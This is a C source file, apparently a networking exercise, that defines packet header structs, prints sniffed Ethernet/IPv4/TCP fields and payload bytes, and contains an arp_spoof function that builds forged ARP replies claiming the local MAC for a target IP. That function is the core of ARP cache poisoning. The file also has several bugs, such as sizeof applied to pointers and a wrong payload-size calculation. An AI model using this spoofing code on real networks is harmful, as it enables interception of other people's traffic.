#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include <netinet/if_ether.h> //for ETHERTYPE_IP and others
#include <netinet/in.h> //for IPPROTO_TCP and others
//#include <net/inet/arp.h> //for arp
//for inet_ntoa()
#include <sys/socket.h>
#include <arpa/inet.h>

#pragma pack(push, 1)
struct Ethnet_header{
	uint8_t dstMac[6];
	uint8_t srcMac[6];
	uint16_t type;
};

struct Ip4_header{
	uint8_t ver_len;
	uint8_t type;
	uint16_t total_length;
	uint16_t id;
	uint16_t flag_frag;
	uint8_t TTL;
	uint8_t protocol;
	uint16_t checksum;
	uint32_t src;
	uint32_t dst;
	uint8_t opt[40];
};

struct Arp_header{
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t op;
	uint8_t senderMAC[6];
	uint32_t senderIP;
	uint8_t targetMAC[6];
	uint32_t targetIP;
};

struct Tcp_header{
	uint16_t src_port;
	uint16_t dst_port;
	uint32_t sequence;
	uint32_t ack;
	uint8_t offset;
	uint8_t flags;
	uint16_t window;
	uint16_t checksum;
	uint16_t urgp;
	uint8_t opt[40];
};
#pragma pack(pop)


static unsigned char ascii2byte(char *val);

int getmyMAC(char* buf, char* dev);
int arp_spoof(char* out_packet, char* in_packet,int sender, int target, char* myMAC);
int check_arp_type(struct Arp_header *arph, uint16_t htype, uint16_t ptype, uint8_t hlen, uint8_t plen );
int analyze_packet( char* packet );
int print_eth(struct Ethnet_header* eth);
int print_Ip4(struct Ip4_header* iph);
int print_Tcp(struct Tcp_header* tcph);
int print_body( uint8_t* start, uint32_t len );



static unsigned char ascii2byte(char *val)
{
    unsigned char temp = *val;

    if(temp > 0x60) temp -= 39;  // convert chars a-f
    temp -= 48;  // convert chars 0-9
    temp *= 16;

    temp += *(val+1);
    if(*(val+1) > 0x60) temp -= 39;  // convert chars a-f
    temp -= 48;  // convert chars 0-9   

    return temp;

}


int getmyMAC(char* buf, char* dev){
	char macstring[20];
	char filename[256];
	char MAC[6];
	FILE* pf;
	int i;
	sprintf(filename,"/sys/class/net/%s/address",dev);
	if ( !( pf = fopen(filename,"r") ) ){
		return -1;
	}
	if ( sizeof(buf) <6){
		return -2;
	}
	fread(macstring,1,17,pf);
	fclose(pf);
	for(i=0;i<6;i++)
		buf[i] = ascii2byte(macstring+i*3);
	return 1;
}

int arp_spoof(char* out_packet, char* in_packet, int sender, int target, char* myMAC)
{
	struct Ethnet_header* eth_hp;
	struct Arp_header* arp_hp;

	eth_hp = (struct Ethnet_header*) in_packet;
	
	if( ntohs((*eth_hp).type) != ETHERTYPE_ARP ){
		return -1;
	}

	arp_hp = (struct Arp_header*)( in_packet+sizeof(struct Ethnet_header) );

	if(!check_arp_type(arp_hp,1,0x0800,6,4)){
		return -2;
	}
	if( ntohs((*arp_hp).op)!=1 ){
		return -3;
	}
	if( (*arp_hp).senderIP != sender ){
		return -4;
	}
	if( (*arp_hp).targetIP != target ){
		return -5;
	}

	memset(out_packet,0,sizeof(out_packet));
	memcpy(out_packet,(*eth_hp).srcMac,6); //dstMAC
	memcpy(out_packet+6,myMAC,6); //srcMAC = myMAC
	uint16_t ethtype_arp = htons(ETHERTYPE_ARP);
	memcpy(out_packet+12,&ethtype_arp,2);
	memcpy(out_packet+14,&((*arp_hp).htype),6); //copy original htype,ptype,hlen,plen
	uint16_t ARPreply=htons(2);
	memcpy(out_packet+20,&ARPreply,2); //op ARP reply
	memcpy(out_packet+22,myMAC,6); //senderMAC = myMAC
	memcpy(out_packet+28,&((*arp_hp).targetIP),4); //senderIP = org.targetIP
	memcpy(out_packet+32,(*arp_hp).senderMAC,6); //targetMAC = org.senderMAC
	memcpy(out_packet+38,&((*arp_hp).senderIP),4); //targetIP = org.senderIP

	return 1;
}

int check_arp_type(struct Arp_header *arph, uint16_t htype, uint16_t ptype, uint8_t hlen, uint8_t plen ){
	return ( ntohs(arph->htype) == htype && ntohs(arph->ptype) == ptype 
	&& arph->hlen == hlen && arph->plen == plen);
}



int analyze_packet( char* packet )
{
	struct Ethnet_header* eth_hp;
	struct Ip4_header* ip4_hp;
	struct Tcp_header* tcp_hp;
	char* data;
	uint32_t data_size;

	char layer[512]="";


	eth_hp = (struct Ethnet_header*) packet;
	
	if( ntohs(eth_hp->type) == ETHERTYPE_IP ){ //IPv4
		strcat(layer,"/IPv4 ");
		ip4_hp = (struct Ip4_header*) (packet + sizeof(*eth_hp));
		if( ip4_hp->protocol == IPPROTO_TCP ){
			strcat(layer,"/TCP ");
			printf("%s\n",layer);
			tcp_hp = (struct Tcp_header*) (packet + sizeof(*eth_hp) + ((ip4_hp->ver_len)%16)*4);

			print_eth(eth_hp);			
			print_Ip4(ip4_hp);
			print_Tcp(tcp_hp);
			
			data = packet + sizeof(*eth_hp) + ((ip4_hp->ver_len)%16)*4 + ((tcp_hp->offset)>>4)*4;
			data_size = ntohs(ip4_hp->total_length) - ((ip4_hp->ver_len)%16)*4 + ((tcp_hp->offset)>>4)*4;
			print_body(data,data_size);
		}
	}
		
	return 0;
}

int print_eth(struct Ethnet_header* eth)
{
	printf("dst MAC: ");
	printf("%02X:%02X:%02X:%02X:%02X:%02X\n",(*eth).dstMac[0],(*eth).dstMac[1],(*eth).dstMac[2],(*eth).dstMac[3],(*eth).dstMac[4],(*eth).dstMac[5]);	

	printf("src MAC: ");
	printf("%02X:%02X:%02X:%02X:%02X:%02X\n",(*eth).srcMac[0],(*eth).srcMac[1],(*eth).srcMac[2],(*eth).srcMac[3],(*eth).srcMac[4],(*eth).srcMac[5]);
	
	return 0;
}

int print_Ip4(struct Ip4_header* iph)
{
	//only for print, inet_ntop is not neccessary
	printf("src IP: ");
	printf("%s\n", inet_ntoa( *(struct in_addr*)( &((*iph).src ))) );

	printf("dst IP: ");
	printf("%s\n", inet_ntoa( *(struct in_addr*)( &((*iph).dst ))) );

	return 0;
}

int print_Tcp(struct Tcp_header* tcph)
{
	printf("src port: %d\n", ntohs((*tcph).src_port) );
	printf("dst port: %d\n", ntohs((*tcph).dst_port) );

	return 0;
}

int print_body( uint8_t* start, uint32_t len )
{
	int i;
	printf("data size(except header): %d\n",len);
	for(i=0;i<len;i++){
		printf("%02X ",(uint8_t)*(start+i));
	}
	printf("\n");
	return 0;
} 





